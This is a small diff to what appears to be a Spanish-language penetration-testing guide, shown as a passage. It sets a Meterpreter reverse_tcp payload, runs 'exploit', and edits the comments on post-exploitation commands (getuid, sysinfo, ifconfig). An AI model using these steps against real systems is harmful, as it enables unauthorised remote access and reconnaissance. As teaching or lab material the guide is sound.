@@ -332,10 +332,10 @@ set payload linux/x86/meterpreter/reverse_tcp
 
 exploit
 
-# 5. Una vez obtenida la sesión Meterpreter, identificar:
-getuid          # Usuario actual
-sysinfo         # Sistema operativo
-ifconfig        # Interfaces de red
+# 5. Post-explotación 
+getuid
+sysinfo
+ifconfig  
 
 ```
 
